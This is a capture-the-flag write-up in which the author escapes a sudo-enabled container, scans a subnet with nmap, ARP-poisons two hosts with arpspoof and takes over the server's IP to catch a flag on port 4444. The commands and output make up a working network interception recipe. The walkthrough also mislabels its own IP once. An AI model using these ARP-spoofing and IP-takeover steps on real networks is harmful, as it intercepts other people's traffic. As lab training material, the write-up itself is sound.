# Write-up Surreptitious

## Connect to machine through ssh to simpleuser user account
## `sudo -l` to identify you are actually root on the machine (which is a container)
```
User simpleuser may run the following commands on 1fe4763887c9:
    (ALL) ALL
```

## identify we have some nice capabilities `cap_net_admin,cap_net_raw`
```
[root@b534ef69d8b5 simpleuser]# cat /proc/$$/status | grep Cap
CapInh: 0000000000000000
CapPrm: 00000000800435fb
CapEff: 00000000800435fb
CapBnd: 00000000800435fb
CapAmb: 0000000000000000
[root@b534ef69d8b5 simpleuser]# capsh --decode=00000000800435fb
0x00000000800435fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_admin,cap_net_raw,cap_sys_chroot,cap_setfcap
```
This means we can modify our IP address as well as do ARP poisonning.

## `sudo -s` to elevate privileges
## install some nice tools:
- `iproute` for retrieving current ip adress, subnet and interfaces and addind ip addresses
- `nmap` for scanning the backend subnet
- `netcat` for listening TCP requests
- `dsniff` for arp poisoning
# scan the backend network
Identify the subnet is `10.89.1.3/24`:
```
[root@b534ef69d8b5 simpleuser]# ip a                                                                                   
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000                                                                                                                                                   
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                                                                                                                                                                                     
    inet 127.0.0.1/8 scope host lo                                                                                     
       valid_lft forever preferred_lft forever                                                                                                                                                                                                
    inet6 ::1/128 scope host proto kernel_lo                                                                           
       valid_lft forever preferred_lft forever                                                                         
2: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000                                                                                                                                        
    link/ether 96:3b:4c:86:1d:33 brd ff:ff:ff:ff:ff:ff link-netnsid 0                                                  
    inet 10.89.1.3/24 brd 10.89.1.255 scope global eth0                                                                                                                                                                                       
       valid_lft forever preferred_lft forever                                                                                                                                                                                                
    inet6 fe80::943b:4cff:fe86:1d33/64 scope link proto kernel_ll                                                                                                                                                                             
       valid_lft forever preferred_lft forever
```
scan the subnet and identify 4 machines:
```
[root@b534ef69d8b5 simpleuser]# nmap 10.89.1.3/24                                                                      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-01 12:53 UTC                                                        
Nmap scan report for 10.89.1.1                                                                                                                                                                                                                
Host is up (0.0000030s latency).                                                                                                                                                                                                              
Not shown: 999 closed tcp ports (reset)                                                                                
PORT     STATE SERVICE                                                                                                 
2222/tcp open  EtherNetIP-1                                                                                            
MAC Address: 72:8F:D0:E9:25:70 (Unknown)                                                                               
                                                                                                                       
Nmap scan report for 10.89.1.2                                                                                         
Host is up (0.0000020s latency).                                                                                       
Not shown: 999 closed tcp ports (reset)                                                                                
PORT     STATE SERVICE                                                                                                 
4444/tcp open  krb524                                                                                                  
MAC Address: 5E:F9:A4:21:91:59 (Unknown)                                                                               
                                                                                                                       
Nmap scan report for 10.89.1.4                                                                                         
Host is up (0.0000020s latency).                                                                                       
All 1000 scanned ports on 10.89.1.4 are in ignored states.                                                             
Not shown: 1000 closed tcp ports (reset)                                                                               
MAC Address: 4E:86:55:19:43:40 (Unknown)                                                                               
                                                                                                                       
Nmap scan report for b534ef69d8b5 (10.89.1.3)                                                                          
Host is up (0.0000030s latency).                                                                                       
Not shown: 999 closed tcp ports (reset)                                                                                
PORT   STATE SERVICE                                                                                                   
22/tcp open  ssh                                                                                                       
                                                                                                                       
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.34 seconds
```
We identify:
- the gateway `10.89.1.1` with port 2222 open
- a server `10.89.1.2` with port 4444 open
- our machine `10.89.1.2` with port 22 open
- another machine `10.89.1.4` with no open port

## intercept communication
We assume another machine is talking to the server.
We poison another machine and server arp tables.
```
[root@b534ef69d8b5 simpleuser]# arpspoof                                                                               
Version: 2.4                                                                                                           
Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host                                                
[root@b534ef69d8b5 simpleuser]# arpspoof -i eth0 -c both -t 10.89.1.2 -r 10.89.1.4                                     
96:3b:4c:86:1d:33 5e:f9:a4:21:91:59 0806 42: arp reply 10.89.1.4 is-at 96:3b:4c:86:1d:33                               
96:3b:4c:86:1d:33 4e:86:55:19:43:40 0806 42: arp reply 10.89.1.2 is-at 96:3b:4c:86:1d:33                               
96:3b:4c:86:1d:33 5e:f9:a4:21:91:59 0806 42: arp reply 10.89.1.4 is-at 96:3b:4c:86:1d:33                               
96:3b:4c:86:1d:33 4e:86:55:19:43:40 0806 42: arp reply 10.89.1.2 is-at 96:3b:4c:86:1d:33                               
96:3b:4c:86:1d:33 5e:f9:a4:21:91:59 0806 42: arp reply 10.89.1.4 is-at 96:3b:4c:86:1d:33                               
96:3b:4c:86:1d:33 4e:86:55:19:43:40 0806 42: arp reply 10.89.1.2 is-at 96:3b:4c:86:1d:33                               
96:3b:4c:86:1d:33 5e:f9:a4:21:91:59 0806 42: arp reply 10.89.1.4 is-at 96:3b:4c:86:1d:33
```
We spoof the ip address of the server and we listen to same port. We wait another machine talks to us.
```
[root@b534ef69d8b5 simpleuser]# ip addr add 10.89.1.2 dev eth0
[root@b534ef69d8b5 simpleuser]# nc -lnvp 4444                                                                          
Ncat: Version 7.93 ( https://nmap.org/ncat )                                                                           
Ncat: Listening on :::4444                                                                                             
Ncat: Listening on 0.0.0.0:4444                                                                                        
Ncat: Connection from 10.89.1.4.                                                                                       
Ncat: Connection from 10.89.1.4:42362.                                                                                 
Congrats, here is the flag: FLAG                                                                                       
[root@b534ef69d8b5 simpleuser]#
```
